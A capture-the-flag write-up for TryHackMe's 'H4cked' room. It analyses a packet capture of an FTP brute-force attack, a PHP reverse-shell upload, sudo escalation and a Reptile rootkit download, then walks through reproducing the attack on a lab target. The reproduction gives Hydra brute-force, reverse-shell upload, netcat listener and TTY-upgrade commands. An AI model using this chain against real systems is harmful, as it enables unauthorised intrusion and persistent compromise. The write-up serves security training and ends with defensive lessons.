<div align="center">

# 🏴 H4cked — TryHackMe
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Completed-brightgreen?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-212C42?style=for-the-badge&logo=tryhackme)

</div>

# H4cked — CTF Write-up

## Overview

This challenge provides a `.pcap` (packet capture) file containing network
traffic that records a full attack chain — from an initial brute-force login
attempt against an FTP server, through to the upload of a PHP web shell, a
reverse shell, privilege escalation to `root`, and finally the installation
of a kernel-level rootkit (**Reptile**) used to read a hidden `flag.txt`.

The goal of **Task 1** is to analyze the capture and answer a series of
questions about each stage of the attack. **Task 2** is a practical exercise:
reproduce the attack on a live target machine to retrieve the flag.

| Item | Detail |
|---|---|
| **Category** | Network Forensics / Packet Analysis |
| **Difficulty** | Easy–Medium |
| **Artifacts provided** | `h4cked.pcap` |
| **Tools used** | Wireshark, THC Hydra, Netcat (`nc`), Bash/Linux shell |
| **Skills tested** | Protocol analysis (FTP/TCP), credential brute-forcing, web shell exploitation, reverse shells, Linux privilege escalation, rootkits |

---

## Tools Used

- **Wireshark** – to open and inspect the `.pcap` file, follow TCP streams,
  and filter traffic by protocol (FTP, TCP).
- **THC Hydra** – the brute-force tool identified in the capture, also used
  in Task 2 to recover the FTP password.
- **Netcat (`nc`)** – used to catch the reverse shell sent back from the
  uploaded PHP backdoor.
- **Linux Bash shell** – used for post-exploitation commands (`whoami`,
  `pty.spawn`, `sudo su`, `ls`, `cat`, `git clone`).

---

## Task 1 — PCAP Analysis

The `.pcap` file was opened in Wireshark. Traffic was filtered by the `ftp`
protocol and individual TCP streams were followed (*Follow → TCP Stream*) to
reconstruct the attacker's session in plaintext.

### Part 1 — Which service is the attacker targeting?

**Answer:** `FTP`

The capture shows repeated connection attempts and authentication requests
on the FTP control port (21), indicating the attacker is targeting the FTP
service.

<img width="1004" height="138" alt="image" src="https://github.com/user-attachments/assets/066dfe91-92fd-4b2d-9307-2eccbf1200a4" />


### Part 2 — What brute-force tool (by Van Hauser) is used?

**Answer:** `THC Hydra`

THC Hydra is a fast, widely used brute-force/credential-cracking tool created
by **Van Hauser**, a member of *The Hacker's Choice (THC)*. It can target many
network services — SSH, FTP, HTTP/HTTPS, Telnet, SMB, RDP, MySQL, and others —
by rapidly trying username/password combinations. It is commonly used in
authorized penetration tests to identify weak credentials.

### Part 3 — What username does the attacker log in with?

**Answer:** `jenny`

The repeated `USER jenny` commands are visible in the FTP control channel
traffic.

### Part 4 — What is the user's password?

**Answer:** `password123`

Following the TCP stream for the successful login attempt reveals the `PASS`
command containing the plaintext password.

### Part 5 — What is the FTP working directory after login?

**Answer:** `/var/www/html`

This is the web root, indicating the FTP account has access to the directory
served by the web server — setting up the next stage of the attack.

### Part 6 — What is the backdoor's filename?

**Answer:** `shell.php`

A `STOR shell.php` command is visible in the FTP stream, showing the attacker
uploading a file named `shell.php` to the web root.



### Part 7 — From which URL can the backdoor be downloaded?

**Answer:** `http://pentestmonkey.net/tools/php-reverse-shell`

Inspecting the contents of the uploaded `shell.php` shows a comment
referencing the original source of this well-known PHP reverse shell script.

<img width="1004" height="401" alt="image" src="https://github.com/user-attachments/assets/9f6729c7-a379-45a0-8413-280d1349ae08" />


### Part 8 — What command does the attacker run first after getting a shell?

**Answer:** `whoami`

This is the first command executed after the reverse shell connects back —
a standard reconnaissance step used to identify the privilege level of the
compromised account.

### Part 9 — What is the hostname of the compromised machine?

**Answer:** `wir3`

The shell prompt format `<user>@<hostname>:` is visible in the upgraded
shell, showing `jenny@wir3:`.



### Part 10 — What command is used to spawn a full TTY shell?

**Answer:**
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This is the standard technique to upgrade a basic reverse shell (e.g., from
`nc`) into a fully interactive TTY, enabling features like tab-completion,
command history, and `Ctrl+C` handling.



### Part 11 — What command is used to gain a root shell?

**Answer:** `sudo su`

The capture shows the user `jenny` has `sudo` privileges (`(ALL : ALL) ALL`)
and uses `sudo su` to escalate directly to `root`, confirmed by `whoami`
returning `root`.

<img width="667" height="167" alt="image" src="https://github.com/user-attachments/assets/60b5d85f-75e7-4e33-ac14-ea39a94ff0d4" />


### Part 12 — What GitHub project does the attacker download?

**Answer:** `Reptile`

The attacker clones the project directly from GitHub:
```
git clone https://github.com/f0rb1dd3n/Reptile.git
```

<img width="780" height="139" alt="image" src="https://github.com/user-attachments/assets/9bb7d806-9ce1-40f9-9746-f11ad82aa259" />


### Part 13 — What type of backdoor is this project used to install?

**Answer:** `LKM (Loadable Kernel Module) Rootkit`

**Reptile** is a Linux Kernel Module (LKM) rootkit. It hides processes,
files, network connections, and provides persistent, hard-to-detect root
access — making it extremely difficult to detect via normal system tools.

---

## Task 2 — Practical Exploitation (Reproduce the Attack)

The objective of Task 2 is to follow the same attack chain against a live
target VM and retrieve `flag.txt` from inside the `Reptile` directory.

### Step 1 — Brute-force the FTP credentials

Since the password may have been rotated, **THC Hydra** is used to recover
valid FTP credentials for the user `jenny`:

```bash
hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://<target-ip>
```

### Step 2 — Upload the PHP reverse shell via FTP

Log in to the FTP server with the recovered credentials, navigate to the web
root, and upload a copy of the `php-reverse-shell.php` (renamed `shell.php`):

```bash
ftp <target-ip>
ftp> cd /var/www/html
ftp> put shell.php
```

Before uploading, edit `shell.php` and set the `$ip` and `$port` variables to
the attacking machine's IP address and a listener port of your choice.

<img width="1004" height="649" alt="image" src="https://github.com/user-attachments/assets/642f5479-fd51-4e58-afff-3ddeff5c2811" />


### Step 3 — Start a listener and trigger the shell

On the attacking machine, start a Netcat listener:

```bash
nc -lvnp <port>
```

Then trigger the uploaded shell by browsing to:
```
http://<target-ip>/shell.php
```

A reverse shell connection is received from the target on the chosen port.

<img width="1004" height="301" alt="image" src="https://github.com/user-attachments/assets/a42391c1-0d4d-404e-b847-767b4ac96c46" />


### Step 4 — Upgrade to a full TTY shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
<img width="864" height="356" alt="image" src="https://github.com/user-attachments/assets/a2d6e528-45c7-4c3c-a663-6579d01cf133" />

### Step 5 — Escalate to root

The compromised user `jenny` has `sudo` rights, so:

```bash
sudo su
```

### Step 6 — Retrieve the flag

Navigate to the `Reptile` project directory and read the flag file:

```bash
cd ~/Reptile
cat flag.txt
```

<img width="1004" height="848" alt="image" src="https://github.com/user-attachments/assets/772073e5-143a-4c18-a8e4-3c53b367fa4c" />


---

## Summary of Findings

| # | Question | Answer |
|---|---|---|
| 1 | Targeted service | FTP |
| 2 | Brute-force tool | THC Hydra |
| 3 | Username | jenny |
| 4 | Password | password123 |
| 5 | FTP working directory | /var/www/html |
| 6 | Backdoor filename | shell.php |
| 7 | Backdoor source URL | http://pentestmonkey.net/tools/php-reverse-shell |
| 8 | First command after shell | whoami |
| 9 | Hostname | wir3 |
| 10 | TTY upgrade command | `python3 -c 'import pty; pty.spawn("/bin/bash")'` |
| 11 | Root escalation command | sudo su |
| 12 | GitHub project | Reptile |
| 13 | Backdoor type | LKM Kernel Rootkit |

## Key Takeaways / Lessons Learned

- **FTP transmits credentials in plaintext** — never used for authenticated
  access on production systems; use SFTP/FTPS instead.
- **Weak/reused passwords** (e.g., `password123`) are trivially recovered by
  brute-force tools like Hydra; enforce strong password policies and
  account lockouts.
- **Upload directories on web servers must be restricted** — allowing
  arbitrary file uploads (e.g., `.php`) into a web-served directory is a
  direct path to remote code execution.
- **Excessive `sudo` privileges** for low-privilege accounts allow trivial
  privilege escalation; follow the principle of least privilege.
- **Kernel-level rootkits like Reptile** can persist undetected; file
  integrity monitoring and kernel module allow-listing help mitigate this.

